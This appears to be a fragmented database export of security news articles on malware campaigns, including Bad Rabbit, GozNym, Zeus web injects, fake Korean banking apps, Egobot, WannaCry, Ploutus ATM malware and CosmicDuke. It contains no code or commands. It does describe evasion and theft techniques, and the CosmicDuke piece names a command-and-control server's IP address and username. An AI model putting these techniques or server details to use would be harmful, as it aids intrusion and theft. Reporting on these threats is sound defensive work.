targets, such as the airport in Odessa, the Kiev subway, the State Aviation Service of Ukraine, and the Transport Ministry of Ukraine. Contrary to initial reports, the Bad Rabbit ransomware does in fact appear to leverage an NSA-linked exploit to spread within compromised networks. The exploit in question is called EternalRomance and its details were leaked by the hacker group Shadow Brokers back in April. The vulnerability leveraged by the exploit was patched by Microsoft in March. EternalRomance was also one of the exploits leveraged by the NotPetya wiper. " }

Dubbed by IBM “GozNym,” the threat has been used to target 22 financial institutions in the United States and two in Canada. The malware has been used in attacks aimed at banks, credit unions, e-commerce platforms, and retail banking. While the campaign only started this month, IBM believes the attackers have already stolen millions of dollars from victims. Nymaim has been mainly known as a dropper used to deliver ransomware, including its own police-themed screen locker, which blocks computers and instructs victims to pay a “fine”. Researchers believe that the developers of Nymaim, a stealthy threat that includes efficient evasion techniques, recompiled the malware’s source code with code taken from Gozi ISFB, a variant of the well-known banking Trojan that was spotted targeting Swiss users earlier this year. Gozi’s source code was leaked on two occasions over the past years. “We know that Gozi is still very active in the underground, and even some of its authors are actively being investigated by law enforcement agencies. They have changed their model and sell some specific modules to different malware projects,” Andrew Komarov, chief intelligence officer at InfoArmor, told SecurityWeek. “You may see posts about ‘Gozi for rent’ for $400 per week, supporting WEB-injects for Chrome, IE, Firefox, and have modules similar to well-known online banking Trojans like Zeus and SpyEye (VNC, keylogger – used for successful online-banking theft).” Until November 2015, Nymaim was primarily used as a ransomware dropper, but towards the end of the year IBM X-Force researchers noticed that the malware had started fetching a Gozi ISFB web injection module and using it to launch online banking attacks. The threats were combined into a single piece of malware in early April, with Nymaim being launched in the first stage of deployment and the Gozi ISFB component in the second stage. “The new GozNym hybrid takes the best of both the Nymaim and Gozi ISFB malware to create a powerful Trojan. From the Nymaim malware, it leverages the dropper’s stealth and persistence; the Gozi ISFB parts add the banking Trojan’s capabilities to facilitate fraud via infected Internet browsers,” explained Limor Kessem, executive security advisor at IBM. The GozNym sample analyzed by IBM is currently detected by most major antivirus vendors based on its signature. “Unfortunately, the leak of source codes of famous online banking Trojans created a new market with modifications and different variations, but they are based on exactly the same principles as several years ago. Security bypass and AV evasion mechanisms are rapidly changing due to the efforts of the security community, this is why those bad actors are looking for new and private zero-day exploits for modern platforms and specific security solutions,” Komarov said.

Dubbed the Apollo campaign by Trend Micro, the campaign uses a highly customized version of Zeus in tandem with an exploit for an old vulnerability in Microsoft Word. In most of the incidents, the attack begins with an email that is disguised as a message from the Ukranian government. The spoofed emails have attachments that exploit CVE-2012-0158, which was patched by Microsoft in MS12-027.   \"The malicious .EXE file is a customized ZeuS variant, which uses bot version 2.7.6.8,\" according to a research paper on the campaign. \"It also has a specially named malicious component that contains Webinject files for specific online banks and payment services, all based in Eastern Europe.\" \"In the past, banking Trojans like SpyEye and ZeuS used Webinject files as additional tools to steal victims’ personal online banking, webmail service, and financial service account credentials,\" the paper continues. \"A Webinject file contains several lines of JavaScript and HTML code to mimic or create fake pop-up notifications that ask users for their credentials every time they access their online bank accounts. In addition, Webinject files are capable of adding extra fields for users to fill up.\"   The malware's configuration file was modified to download four additional modules to take screenshots and log keystrokes as opposed to using the usual redirection. This modification is likely meant for banks with advanced authentication measures, according to the paper.   Trend Micro found more than 5,000 IP addresses worldwide impacted by the attack. Some of the compromised computers were located in North America. In addition to Zeus, the attackers used other information-stealing malware such as the Bleeding Life exploit pack, Pony Loader and Ann Loader.   \"Our research shows that while most banking Trojans target well-known banks (in the US, UK, etc), there are some that prefer a more regional and less conventional approach and by using several tools available underground, the operators were able to carry off their plans,\" blogged Trend Micro Senior Threat Researcher Jessa De La Torre. \"Moreover, it also demonstrates that cybercriminals are always looking for alternative ways to adapt to defenses.\"  The paper is available here.

DocuSign recently issued a couple of malicious email campaign alerts to warn users of fake emails set up to deliver malware via macro-enabled Word documents. The fake messages appeared to come from addresses such as [email protected] and [email protected], and they carried the subject line “Completed: [domain name] – Wire transfer for recipient-name Document Ready for Signature” and “Completed [domain name/email address] – Accounting Invoice [Number] Document Ready for Signature.” On Monday, DocuSign admitted that the spike in malicious emails was the result of a security breach. According to the company, hackers breached a “non-core system” designed for sending service-related email announcements to users. The firm said the attackers only accessed email addresses; there was no evidence that names, physical addresses, passwords, social security numbers, payment card data or other information had been compromised. “No content or any customer documents sent through DocuSign’s eSignature system was accessed; and DocuSign’s core eSignature service, envelopes and customer documents and data remain secure,” DocuSign stated. The company said it locked the attackers out of its systems and rolled out additional security controls. Law enforcement agencies have been notified of the incident. DocuSign-themed spam campaigns are not uncommon, but having a list of email addresses that are known to belong to the company’s customers increases the likelihood of recipients opening the malicious emails. DocuSign has advised users to be wary of these malicious emails and forward any suspicious messages to [email protected]. “[The emails] may appear suspicious because you don’t recognize the sender, weren’t expecting a document to sign, contain misspellings (like ‘docusgn.com’ without an ‘i’ or @docus.com), contain an attachment, or direct you to a link that starts with anything other than docusign.com or docusign.net,” DocuSign said.

Dubbed the Yanbian Gang by researchers at Trend Micro, the cybercriminals used fake banking applications with the same icons and user interfaces as they legitimate apps to trick users. They also used other popular apps, such as utilities, chat, portal and security apps to rope users into their scam and steal their mobile banking credentials. These fake apps uploaded stolen user information such as mobile phone numbers, account names and numbers and login credentials to the attackers' command and control (C&C) servers. Text messages were stolen and uploaded as well. The group got its name from the region the gang is believed to operate in, the Yanbian Prefecture in Jilin, China. It is believed to consist of four groups – the organizers, cowboys, translators and the malware creators. The cowboys are responsible for collecting the proceeds from successful attacks and passing them onto the organizer; the translator localizes the threats depending on the country the gang wants to target; the malware creator makes the malware and the organizer brings everything together. According to Trend Micro Mobile Security Engineer Simon Huang, the gang used a variety of Android malware for their schemes. None of the malware used by the gang was distributed through Google Play or third-party app stores. Instead, all of it was delivered through malicious text messages or downloaded by other malware. Together, the group is believed to have stolen millions of dollars from mobile banking customers of at least five banks in South Korea since 2013. \"In our research, we saw fake versions of apps of five South Korean banks—KB Kookmin Bank, NH Bank, Hana Bank, Shinhan Bank, and Woori Bank. These apps steal user information and credentials,\" Huang blogged. \"They also have the ability to uninstall and take the place of the real apps they are spoofing. This allows them to run undetected while obtaining what they are after—victims’ personal account credentials that translate to financial gain for the fake apps’ operators.\" The gang also created fake versions of other types of apps popular with Android users such as porn apps, the Google Play app and Adobe Flash Player. In their analysis Trend Micro examined a total of 1,007 fake Google app versions, 994 of which were fake versions of the Google Play app. The remaining 13 were fake versions of other Google apps. \"The hackers used fake banking and other popular apps to victimize more than 4,000 South Korean Android mobile banking customers throughout 2013 and 2014,\" according to a research report by Trend Micro. \"They also used effective social engineering lures like “The Interview” to bait victims into installing their fake apps.\" Another example of a lure used by the gang was to attempt to scare users into clicking on malicious links via SMS phishing messages presented as messages from law enforcement. \"When clicked, however, the link installed a malicious app in their devices that communicated with designated C&C servers to listen for commands,\" the report notes. \"We first spotted these malware in September 2013 and continued to see them till April 2014, proving the steadfast nature of the threats.\" Last year, a report from Trend Micro noted that China's underground market for mobile malware and malicious services is thriving, with everything ranging from spamming to SMS forwarding Trojans for sale.  " }

PowerWare and PoshCoder The existence of PowerWare was brought to light in late March by Carbon Black. The threat attracted the attention of researchers because it abused macro-enabled Microsoft Word documents and Windows PowerShell. PowerWare, which has been spotted targeting healthcare organizations, contains a weakness that could be leveraged to recover files without paying the ransom. Earlier this month, AlienVault published a blog post highlighting the similarities between PowerWare and PoshCoder, an older piece of ransomware that leveraged PowerShell and which contained a logic flaw that led to encrypted data getting damaged. AlienVault determined that PowerWare is heavily based on PoshCoder. The programming style and flow is very similar, and some might even consider PowerWare a variant of PoshCoder instead of a new ransomware family. One of the most significant similarities is related to the use of the RijndaelManaged class. The class is not uncommon, but the way it’s used in both PoshCoder and PowerWare suggests a connection between the threats. Researchers also found that with a few exceptions, both ransomware families attempt to encrypt the same file types — only five of 451 targeted file types don’t match. On the other hand, there are some differences in the codebase and PowerWare does not include the logic flaw that caused PoshCoder to make some files impossible to recover. Rokku and Chimera On Monday, researchers at antivirus firm Malwarebytes reported finding a possible link between Rokku and Chimera file-encrypting ransomware. Rokku made headlines last month after experts noticed that the ransomware allows victims to scan a QR code in order to obtain information on how to make the ransom payment. Chimera was discovered in December 2015, when it had been used to target small companies. The malware caught the eye of researchers because it threatened victims that their files and credentials will be posted online unless they pay the ransom — although this turned out to be an empty threat as Chimera doesn’t actually upload files to its server. An analysis conducted by Malwarebytes showed that the DLL files containing the core malicious functionality in both Rokku and Chimera used the ReflectiveLoader function, which is used for reflective DLL injection, a technique that can be used to load a library from memory into a host process. Another similarity between Rokku and Chimera is that both pieces of ransomware have locally implemented cryptography, and in both cases the decryptor tool can be downloaded by victims before they pay the ransom. “The found similarities lead us to the conclusion, that Rokku may be a product of the same authors – prepared with a similar schema but with different needs in mind,” Malwarebytes malware analyst hasherezade wrote in a blog post. Ransomware created using publicly available code While in some cases one malware author creates several different pieces of ransomware, some ransomware families are similar because their developers used the same publicly available code. One example is Hidden Tear, a piece of ransomware whose source code was made public by a white hat hacker for educational purposes. Several pieces of ransomware are based on Hidden Tear, and most of them include an encryption flaw that the original developer implemented on purpose to prevent abuse. The list of threats based on Hidden Tear includes Cryptear, Linux.Encoder, Magic, and more than two dozen spin-offs of a malware detected by Kaspersky Lab as Trojan-Ransom.MSIL.Tear. " }

The attack, which has been traced back to 2009, often begins with a spear-phishing email containing malware. So far, the targeted businesses have fallen into four main categories: finance and investment, infrastructure and development, government agencies and defense contractors. While many of the victims have been in South Korea, others are located in Australia, Russia, Brazil and the United States.   \"The attackers gather information about their targets using social engineering techniques prior to luring them into the trap,\" explained Symantec's Jeet Morparia. \"The targets are sent a spear phishing email, often pretending to be sent from a person they already know. The spear phishing email contains a relevant or enticing message to the target, prompting them to open the malicious attachment. The malicious attachment may be a shortcut .lnk file that points to a file hosted on GeoCities Japan.\"   In addition to .LNK files, the attackers have also used malicious Microsoft Word documents that exploit CVE-2010-3333 and CVE-2011-0609. They have also taken to using .HWP files containing a script that downloads a malicious file.   When the attachments are opened, the attachments download malware from GeoCities Japan. The dropped executable then retrieves a RAR file from GeoCities Japan. Both these files are disguised as XML documents in an attempt to pass as a clean file, Morparia noted.    The executable RAR file drops a set of files responsible for moving files around, injecting a component into processes and stealing system information such as the Windows version, install language and installed service pack version.   \"The main payload has specific functions that are potentially disastrous for targeted business executives. These functions include: recording video, recording audio, taking screenshots, uploading files to a remote server, obtaining a recent document list, searching for a string or pattern in a file [and] deleting and setting restore points,\" Morparia blogged. \"The stolen information is uploaded to remote servers hosted in Malaysia, Hong Kong, and Canada. The attackers have also updated their code to include 64-bit versions to work seamlessly across 64-bit platforms.\"   Egobot has been able to stay under the radar due to a number of components responsible for masking its presence. For one, Egobot is compiled using an older version of Microsoft's Detours software package functionality, which includes the detoured.dll file and is used by the attackers to attach malicious .dll files to legitimate Win32 binaries. Egobot can use this file to run itself in the memory of a legitimate process, disguising it as a benign process, the researcher explained. In addition, there is a coordinator component that prepares files by moving them into the appropriate folders and injecting them into legitimate processes, and certain versions of the backdoor include a timer so that the Trojan deletes itself after a certain date.   The Egobot attack has been linked to a parallel campaign that traces back to 2006, and uses an infostealer known as Nemim, and has targeted organizations in Japan, the U.S., India and the United Kingdom.   \"One of the earliest samples contained a timer mechanism to determine when to remove itself from the compromised computer,\" blogged Symantec researcher Andrea Lelli. \"Removal was conditional and tied to a fixed date or based on the number of times the sample was executed. The timer mechanism feature was also found in samples of Egobot.\"   An analysis of the Nemim binaries also revealed other connections to Egobot, including similarities in the command and control communication format and use of encryption. While Egobot is highly targeted and estimated to have infected less than 100 machines, Nemim, is believed to have impacted thousands.    \"Nemim continues to operate today and has effectively evolved over time,\" blogged Lelli. \"For instance, the string encryption has become non-trivial, stolen digital certificates have been upgraded with newer ones, and there are now checks in place to detect common virtual machines. Indeed, for the last seven years the attackers have shown an unwavering commitment to innovation and have developed malware that is adaptable to fit the needs of two different attack campaigns.\" " }
{ "_id" : { "$oid" : "5b27c4dc6cefc41c844ab3f8" }, "Category" : "Malware", "Title" : "Industrial Systems at Risk of WannaCry Ransomware Attacks", "Address" : "https://www.securityweek.com/industrial-systems-risk-wannacry-ransomware-attacks", "Date" : "May 16, 2017", "Article" : " Experts and vendors have warned that industrial control systems (ICS) are also at risk of being compromised in WannaCry ransomware attacks. The WannaCry ransomware, also known as Wanna Decryptor, WanaCrypt0r, WannaCrypt, Wana Decrypt0r and WCry, has infected more than 200,000 systems worldwide, including ones housed by banks, hospitals, ISPs, government agencies, transportation companies and manufacturing plants. While the campaign has helped the attackers make more than $50,000 in just a few days, not everyone is convinced that profit-driven cybercriminals are behind the operation, with some suggesting that it could be the work of a nation-state actor. The attacks involved an exploit named EternalBlue and a backdoor dubbed DoublePulsar, both leaked recently by a hacker group calling itself Shadow Brokers. The exploits were allegedly used by a threat actor called the Equation Group, which has been linked to the NSA. The EternalBlue exploit leverages a Server Message Block (SMB) vulnerability in Windows that can be exploited remotely without user interaction, which is the main reason why the ransomware managed to wreak havoc. The flaw was patched by Microsoft in March and the tech giant has even made available fixes for outdated versions of Windows. However, many organizations have not installed the patches and the situation is even more complicated in the case of industrial systems. An advisory published by ICS-CERT on Monday informs users that automation giants Rockwell Automation and Schneider Electric have provided recommendations on how customers can prevent attacks. This includes installing Microsoft’s patches, updating security software, creating backups, training employees, and configuring access controls to block unauthorized access to sensitive systems. ICS-CERT also referenced an advisory published by medical technology firm BD (Becton, Dickinson and Company), which issued a warning after the WannaCry attacks affected many healthcare facilities. ICS security firm Claroty pointed out that the ransomware has already hit Windows systems running ICS software, causing failures that impacted production. Some of the affected manufacturing companies decided to halt production due to concerns for personal safety and potential damage to expensive assets. The company believes industrial environments are particularly susceptible to these types of attacks for several reasons, including the improper segmentation of IT and OT networks, unpatched Windows machines, and the presence of SMB on devices hosting HMIs, engineering workstations, historians and other systems. Another problem highlighted by Claroty is related to WannaCry’s kill switch. This kill switch involves a non-existent domain name that the malware contacts before initiating its malicious routine. If the domain does exist, the malware terminates – this has allowed the security community to neutralize some variants of the threat by registering the domain names specified in the malware code. This discovery may have prevented many computers from becoming infected, but industrial systems are typically not connected to the public Internet, which makes the kill switch useless, Claroty said. While patching Windows machines is the best way to prevent attacks, Barak Perelman, CEO of industrial cyber security company Indegy, noted that this is not an option in many industrial environments as these systems often need to operate non-stop and they cannot be restarted. Another problem is that deploying security patches could have a negative impact on the stability and availability of a system. Phil Neray, VP of Industrial Cybersecurity at CyberX, also believes that patching the vulnerability is not easy in the case of ICS. “It's worth noting that many of the SCADA applications embedded in our electrical grid and manufacturing plants were developed years ago and are tethered to older versions of Windows -- so the fix isn't going to be easy,” Neray said. “In the meantime, we should treat this attack as a persistent threat and continuously monitor both IT and OT networks for unusual activity. After all, how do we know that the same vulnerabilities haven't already been well-exploited for cyber-reconnaissance and cyber-espionage purposes? Or, that this isn't just the first phase of a more elaborate targeted campaign with the goal of causing massive disruption to our critical infrastructure and our economies?” the expert added. " }

The rate of mobile infections in 2014 was 0.68%, which represents a 25% increase compared to the previous year. According to the telecoms company, 16 million is a conservative estimate considering that its sensors don’t have complete coverage in regions like China and Russia. “In mobile networks, Android devices have now caught up to Windows laptops as the primary workhorse of cybercrime. With one billion Android devices shipped in 2014, the platform is a favorite target of cybercriminals who can have lots of infection success without a lot of work,” Kevin McNamee, director of Alcatel-Lucent Motive Security Labs, wrote in a blog post. “Android is more exposed than rivals because of its open platform and by allowing users to download apps from third-party stores where apps are not always well vetted.” The number of Android malware samples in Motive Security Labs’ database increased by 161% last year, reaching close to 1.2 million. The company has pointed out that the sophistication of Android malware has also increased. Older variants used primitive command and control (C&C) mechanisms, they had hard-coded and inflexible configurations, and they were easy to detect. However, in 2014, malware authors started leveraging more advanced techniques and even integrated rootkit technologies, a trend demonstrated by threats such as NotCompatible and Koler. According to the report, six of the top 20 mobile pieces of malware are from the spyware category. These types of threats are designed to track users’ location, calls, text messages, emails, and Web browsing. As far as residential fixed broadband networks are concerned, infection rates increased last year, but mainly due to adware. High-level threat infections (bots, rootkits, banking Trojans) increased slightly in the second quarter of 2014, but then they dropped again to roughly 5%, the report shows. Researchers have also pointed out that many consumers avoid shopping online to prevent their credit card information from being stolen by cybercriminals. However, the risks are even greater at brick-and-mortar stores where cash registers and point-of-sale (PoS) terminals can become infected with malware. “Card information stolen from online retailers can only be used for online purchases. Online purchases typically need to be shipped to the address of the card owner, making them less usable to fraudsters,” reads the report. “Because the point-of-sale-based malware records all the information in the magnetic strip on the card, the data they collect can be used to make new physical cards. Criminals use these forged cards in stores to buy expensive items such as electronics, which can easily be sold for cash.” " }

Ramdo, also known as Redyms, helps cybercriminals make a profit by silently clicking on online ads from infected systems. The malware is also capable of downloading and installing additional malicious software on infected devices. Once it infects a computer — primarily by leveraging exploit kits such as Angler, RIG and Magnitude — Ramdo checks for the presence of sandboxes and virtual machines, which could indicate that the threat is being analyzed by researchers. If these types of applications are not detected, the malware creates a new Windows process and injects a malicious DLL into it. The malware then contacts its command and control (C&C) server and downloads a copy of the Chromium Extended Framework, which allows users to embed Chromium-based browsers in other applications. This browser is used to navigate to pages containing advertisements. However, the attackers have designed the malware to access the ads via a specially designed search portal instead of navigating to them directly. By accessing websites from a search portal that displays links to sponsored ads, website analytics tools are tricked and advertisers are led to believe their ads were accessed by a user conducting a Web search instead of a bot. Ramdo checks for the presence of virtual environments by analyzing the CPU to see if it’s running in hypervisor mode. It also checks for the presence of a sandbox by searching for specific strings. Unlike other malware, Ramdo doesn’t completely stop if it detects a sandbox or a virtual machine. Instead, it changes its behavior and generates special command and control (C&C) domains that the malware connects to. By using this technique, attackers can not only throw researchers off track, but they can also learn when someone is trying to analyze their malware. Experts determined that, starting with June 2015, Ramdo has been using HTTPS to communicate with its C&C servers, whose domains are generated using a domain generation algorithm (DGA). Sinkholing Ramdo C&C servers revealed that most Ramdo infections are in the United States, followed by Germany, Australia and Japan. Over the course of seven days, more than 70,000 connections were made to the sinkholes from roughly 1,000 unique IP addresses, 434 of which were located in the US. Based on their analysis, Palo Alto Networks and Dell SecureWorks concluded that while Ramdo is not particularly sophisticated, its operators are actively working on implementing new features to avoid detection and prevent analysis.

Similar to the NotPetya wiper that infected tens of thousands of systems back in late June, Bad Rabbit also uses the Server Message Block (SMB) protocol to spread within the compromised network. However, researchers initially claimed that, unlike NotPetya, the ransomware did not use either of the SMB exploits tracked as EternalBlue and EternalRomance. It turns out that while Bad Rabbit does not use EternalBlue, it does in fact leverage EternalRomance to propagate in the network. The presence of the exploit was first reported by Cisco Talos and later confirmed by F-Secure. The EternalRomance vulnerability was addressed by Microsoft in March 2017 with the release of a security bulletin that also patched the EternalChampion, EternalBlue and EternalSynergy exploits. Details of these flaws were made public by a hacker group calling itself Shadow Brokers earlier this year. The group claims to have obtained these and many other exploits from the NSA and that they were used by one of the agency’s teams known in the cybersecurity industry as the Equation Group. When the exploits were made public by the Shadow Brokers in April, Microsoft pointed out that they had already been fixed, which has led some to believe that the tech giant learned about the vulnerabilities from the NSA itself. The initial analysis showed many connections between Bad Rabbit and NotPetya, including targeting of Ukraine and Russia, binaries signed with expired certificates, use of Mimikatz for credential-grabbing, reboots and persistence via scheduled tasks, removal of event logs and USN change journals, and the same type of file encryption and ransomware functionality. One of the most significant differences is the fact that Bad Rabbit appears to be an actual ransomware and, at least in theory, users can recover their encrypted files if they pay the ransom. NotPetya, on the other hand, has been classified as a wiper due to the fact that the ransom payment functionality is not implemented properly, making the recovery of files impossible. Another major difference is the fact that Bad Rabbit mostly affected enterprises, particularly in Russia. However, it’s worth noting that many of the victims in Ukraine are high-profile organizations. NotPetya has been linked to the Russian threat actor known as BlackEnergy, TeleBots and Sandworm Team, which suggests that the same group may be behind the Bad Rabbit attacks as well, although not everyone seems convinced. An analysis of the Bad Rabbit infrastructure showed that some of the compromised domains used in the attack had been set up since at least July and some of the injection servers were first seen more than a year ago.

For its victims, the Sweet Orange kit may be sour to taste. The kit exploits vulnerabilities in Internet Explorer, Java and Adobe Flash Player. The researchers discovered the infection June 28. The site was cleaned last week, and is no longer infected. \"We believe that the attackers compromised Dailymotion in order to target a large number of users,\" blogged Symantec's Ankit Singh. \"Dailymotion is in Alexa’s top 100 most popular websites list, so the attackers could have potentially infected a substantial amount of users’ computers with malware through this attack.

Though the quote is apocryphal, it could very easily be used to summarize the attitude of attackers targeting automatic teller machines (ATMs).   Using malware to target ATMs is not new. However, researchers at multiple security firms recently turned a spotlight on an attack affecting ATM machines in Mexico. It begins with a picked lock and ends with a machine spitting out money in unauthorized transactions.   According to researchers at Symantec, after picking the lock and gaining physical access to the machines, the attacker inserts a new boot disk into the CD-ROM drive that installs the Ploutus malware.   \"The criminals created an interface to interact with the ATM software on a compromised ATM, and are therefore able to withdraw all the available money from the containers holding the cash, also known as cassettes,\" Symantec's Security Response team. \"One interesting part to note is that the criminals are also able to read all the information typed by cardholders through the ATM keypad, enabling them to steal the sensitive information without using any external device.\"   Ploutus runs as a Windows service named NCRDRVPS. The attackers created an interface to interact with ATM software on a compromised ATM through the NCR.APTRA.AXFS class. The malware was developed with .NET technology and obfuscated with the Confuser 1.9 software, and its binary is PloutusService.exe.   According to Symantec, the malware generates a randomly assigned number for the compromised ATM machine. It then sets a timer to dispense money. This only happens within the first 24 hours after it was activated.   The malware was spotted last month on ATM machines in Mexico.   \"The emergence of new malware with ability to directly extract cash from ATMs is a very alarming sign for self-service device security,\" Stanislav Shevchenko, chief technology officer at Russian security firm SafenSoft, blogged Sept. 27. \"Malware like this allows the cybercriminals to skip the whole process of cash withdrawal they have to take part in after using traditional ATM trojans and skimmer-like devices to steal the plastic card information.\" " }

The latest dump in the “Vault 7” series details two Windows frameworks named “AfterMidnight” and “Assassin.” AfterMidnight is described as a DLL that self-persists as a Windows service and provides secure execution for “Gremlins,” hidden payloads that allow attackers to subvert the functionality of targeted software, exfiltrate data, and provide internal services for other Gremlins. The tool’s developers also provide a payload called “AlphaGremlin,” which can be used to schedule the execution of custom tasks on a compromised machine. Assassin is a similar implant that allows attackers to execute various tasks on a hacked machine, such as downloading and running an executable, collecting task results, and deleting the executable. Both tools receive instructions from command and control (C&C) servers. WikiLeaks has regularly published Vault 7 files since March 7, including documents describing tools that can be used for man-in-the-middle (MitM) attacks on the LAN, Samsung smart TV hacking tools, a framework used to make attribution and analysis of malware more difficult, and a platform designed for creating custom malware installers. However, the organization has not published any actual exploits in an effort to prevent abuse. The recent WannaCry ransomware attacks, which rely on exploits allegedly developed by the NSA and leaked by the Shadow Brokers, have demonstrated that leaking exploits developed by intelligence agencies could have serious consequences. WikiLeaks has offered to share exploit code with affected tech companies, but it appears they are not too keen to work with the whistleblower organization. On the other hand, based on the available information, many have determined that the vulnerabilities described in the Vault 7 files have already been patched in the latest versions of their products. Cisco did find a critical vulnerability affecting hundreds of its switches in the Vault 7 leak. The company informed customers of the flaw back in March, but it only recently started releasing patches. The tools leaked by Shadow Brokers have been linked to the Equation Group, which is believed to be run by the NSA. In the case of the Vault 7 files, researchers have tied them to a cyber espionage group tracked as “Longhorn” and “The Lamberts.” Related Reading: If the CIA Isnt' Secure, Who Is?

But for those whose credit or debit card information was swiped in a data breach, it may be remembered as the year when a wave of point-of-sale malware crashed into retailers big and small. In its annual Global Threat Intel Report, security firm CrowdStrike noted that criminals began increasingly turning to ready-to-use point-of-sale (PoS) malware kits in the cyber-underground. According to Adam Meyers, vice president of intelligence at CrowdStrike, the price of these kits varied depending on their complexity, with some going for tens of dollars and others costing in the hundreds or thousands. The attacks infected terminals with malware designed to steal credit card information as they are swiped by customers. The malware runs in the background of the terminal, and continuously scans memory for unique patterns found on a card's magnetic strip and send matching data to an attacker-controlled server, the report explains. \"In 2014, while several major companies were coping with breaches of their PoS infrastructure, many smaller retailers were facing the same threat from less-organized groups,\" according to the report. \"Malware such as BlackPoS requires a bit of strategic planning on the part of the adversary; much of the system lacks the point-and-click intuitive nature of commodity botnets,\" the report continues. \"For less-organized or less-skilled adversary groups, an off-the-shelf kit such as Dexter PoS may allow for exploitation and offensive capabilities that may not otherwise be possible.\" The report notes that the explosion of PoS malware may be mitigated by the adoption of EMV standards (Europay, MasterCard and Visa) as well as the growth of payment options such as Google Wallet and Apple Pay. \"Adoption of these newer payment processes should provide consumers with more secure payment methods and make it more difficult for criminals seeking to make money off these systems,\" according to the report. \"There will be some lag time in 2015 as retailers and banks move to put these improvements in place, during which cybercriminals will still be able to exploit the current, antiquated payment processing systems in the U.S. However, the newer processes, once in place, should lead to a decline in the type of PoS attacks seen over the past year.\"  During the year, the security and law enforcement communities teamed up to takedown Shylock and Gameover Zeus, two major banking botnets that dominated the first half of 2014. After the takedowns, the Dyreza and Dridex emerged as dominant forces in the world of banking malware. \"Dyreza takes a more simplistic approach to banking fraud, acting to intercept logins and perform malicious actions by acquiring the HTTP POST data from under banking SSL sessions,\" according to the report. \"Dridex uses the classic banking Trojan tactic of relying on complex JavaScript web injects targeted at the institutions it wishes to steal from. Both threats rely on the same criminal ecosystem as their predecessors.\" Away from the world of financial crime, hackers were busy launching targeted attacks against organizations around the world. During the year, CrowdStrike identified \"significant activity\" from 39 state-sponsored and nationalist attack groups. Vietnam was the most targeted country due to cyber-assaults by an attack group known as Goblin Panda. Those campaigns relied mainly on spear-phishing and dropped malware such as PlugX in malicious documents. While the report names China-based adversaries as the most prolific when it came to targeted intrusions, Russian and Iranian attack groups were active during the year as well. In fact, Meyers told SecurityWeek, the Russian groups tend to be more sophisticated than the Chinese. For example, Russian attackers leverage public key cryptography to mask their command and control mechanisms and use more complex malware. \"Western businesses and enterprises need to know that there are serious bad guys in North Korea, China, Iran, Russia and other countries working tirelessly on ways to get around our defenses to steal intellectual property, disrupt business and even destroy,\" Meyers noted on the CrowdStrike blog. \"This report gives business and IT leaders a fighting chance to find out who is targeting them and take steps to prepare their networks, minimize intellectual property loss, business downtime, and other effects of cyber security attack that undermine the bottom line.\" " }

As VirusTotal has pointed out, false positives have a negative impact on the security industry, software developers, and end users alike. Software development companies suffer when their customers are no longer able to use their programs, support teams are overwhelmed by complaints about the application not working properly, end users are not able to carry out their tasks, and the antivirus vendor’s reputation can be seriously affected. VirusTotal hopes to address the issue of false positives through a project called “trusted source.” As part of this initiative, major software vendors are asked to share metadata from their software collection. “These files are then marked accordingly at VirusTotal and whenever an antivirus solution (mistakenly) detects them, we notify the pertinent vendor, allowing them to quickly correct the false positive,” VirusTotal’s Emiliano Martinez explained in a blog post. “Additionally, when files get distributed to antivirus vendors, they are tagged so that potential erroneous flags can be ignored, preventing a snowball effect with detection ratios.” In case a false positive is detected, the text “Trusted source!” appears at the top of the file report, along with the name of the company that owns the software in question. In order to make sure these reports are not misleading, the false positives are extracted from the detection ratio count and moved to the bottom of the list. The “trusted source” project started a week ago and so far only Microsoft has shared its files. However, VirusTotal says it has already led to more than 6,000 false positives getting fixed. The malware scanning service urges “very large” software development companies to share their files in an effort to reduce false positives. VirusTotal has highlighted that the initiative is not open to adware and potentially unwanted application (PUA) developers. " }

The newest version, nicknamed 'CosmicDuke' by F-Secure, shares code with an even older piece of malware known as Cosmu whose roots go back to 2001. \"The people behind CosmicDuke and MiniDuke most likely share code and/or tools,\" F-Secure Senior Researcher Timo Hirvonen told SecurityWeek. \"It might even be the same actor behind both malware families. It is still unknown why they decided use an infostealer derived from Cosmu, and how they got access to Cosmu. Did they buy a builder if one exists? Do they have the source code? Did they recruit the guys who originally created Cosmu? We don't know.\" According to F-Secure, the CosmicDuke samples can be divided into three distinct groups based on similarities between the command and control (C&C) servers they contact, their file characteristics and the decoy document used. \"The first group of samples (Group #1) is spread using 3 dropper files that display specific decoy documents,\" F-Secure explained in a whitepaper on the malware. \"The second sample group (Group #2) uses both exploit-loaded files and dropper files.\" The third group, F-Secure noted, does not use the droppers or exploits associated with the other two. All the samples in this group connected to an FTP server at IP 188.116.32.164 using the same username (“adair”) and password. This is the only server that the samples in group three with the original MiniDuke loader use, according to the paper. The older versions of MiniDuke are still around and being used in attack campaigns as well, and use Twitter accounts containing a hardcoded command and control URL pointing to the C&C server. \"After the 2013 exposure, the actor behind MiniDuke appears to have switched to using another custom backdoor, capable of stealing various types of information,\" Kaspersky Lab's Global Research & Analysis Team (GReAT) noted in a blog post. \"The main 'new' MiniDuke backdoor (aka TinyBaron or CosmicDuke) is compiled using a customizable framework called 'BotGenStudio', which has flexibility to enable/disable components when the bot is constructed,\" the Kaspersky Lab researchers explained. The backdoor has a number of capabilities such as keylogging, screen grabbing and password theft. \"The malware implements several methods to exfiltrate information, including uploading data via FTP and three variants of HTTP-based communication mechanisms,\" according to Kaspersky Lab. \"A number of different HTTP connectors act as helpers, trying various methods in case one of them is restricted by local security policies or security software. These three methods are: Direct TCP connection and HTTP session via Winsock library; HTTP session via Urlmon.dll; (and) HTTP session via invisible instance of Internet Explorer as OLE object.\" One of the CosmicDuke servers analyzed by the Kaspersky Lab team had a list of victims going back to April 2012. The server had 265 unique identifiers assigned to victims from 139 unique IPs. Most of the victims were from the countries of Georgia, Russia and the United States. \"While the old style Miniduke implants were used to target mostly government victims, the new style CosmicDuke implants have a somehow different typology of victims,\" according to Kaspersky Lab. \"The most unusual is the targeting of individuals that appear to be involved in the traffic and reselling of controlled and illegal substances, such as steroids and hormones. These victims in the NITRO project have been observed only in Russia. One possibility is that 'BotGenStudio' is a malware platform also available as a so-called 'legal spyware' tool, similar to others, such as HackingTeam’s RCS, widely used by law enforcement agencies. Another possibility is that it’s simply available in the underground and purchased by various competitors in the pharmaceutical business to spy on each other.\" While he did not classify the malware as particular sophisticated, Hirvonen noted that it still manages to get the job done. \"Once we learn about the victims, we know how efficient CosmicDuke has been,\" he said. \"Why build something overly complex or sophisticated if you can get the job done with something rather straightforward? It keeps surprising me how simple yet effective some of the malware used in targeted attacks is.\" *This story was updated with a clarification about the server being used by certain samples of the malware.  " }

